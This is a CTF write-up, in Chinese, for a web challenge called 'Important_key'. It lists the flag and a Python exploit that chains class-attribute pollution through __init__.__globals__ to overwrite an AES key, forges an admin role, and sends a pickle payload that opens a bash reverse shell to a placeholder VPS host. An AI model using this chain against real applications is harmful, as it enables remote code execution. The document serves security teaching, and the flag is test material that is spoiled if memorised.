* **题目名称：** Important_key

* **题目类型：** WEB

* **题目难度：** (中等）

* **出题人：** fru1ts

* **考点：**  

1. python原型链污染
2. pickle反序列化

* **描述：**  都不知道密钥看你们怎么反序列化

* **flag：** XSCTF{p0ll8ti0n_p1ckl3_mast3r_79316}

* **Writeup：** 

  思路：在`login`路由直接给了一个pickle反序列化入口，这里则可以实现RCE。但是要进入反序列化需要进行身份认证，admin才能进入，所以需要进行伪造。可以看到用的是AES-CBC解密，但是需要密钥，而代码中密钥是随机产生的，好像伪造不了。但看到`/`路由，使用了`merge`函数递归合并属性，存在典型的原型链污染。所以可以利用原型链污染修改AES的密钥，然后自己的密钥加密"admin"，然后进行pickle反序列化，由于是无回显所以需要反弹shell。

  exp如下：
  
  ```python
  import requests
  import base64
  import pickle
  from verify import *
  
  
  url=""
  
  def index(key):
      data={
              "__init__":{
                  "__globals__":{
                      "User":{
                          "key":base64.b64encode(key)
                      }
                  }
              }
          }
      res=requests.post(url=url,json=data)
      print(res.text)
  
  def login(key): 
      class EXP():
          def __reduce__(self):
              command=r"__import__('os').system('bash -c \"bash -i >& /dev/tcp/vps/port 0>&1\"')"
              return (eval,(command,)) 
      
      p=EXP()
      op=pickle.dumps(p)
      b64op=base64.b64encode(op)
      # print(b64op)
  
      user=User()
      enc=user.encrypt("admin",key)
      # print(enc)
  
      data={
          "role":enc,
          "data":b64op
      }
      r=requests.post(url=url+"login",data=data)
      print(r.text)
  
  if __name__=="__main__":
      key=os.urandom(16)
      index(key)
      login(key)
  ```
  
  
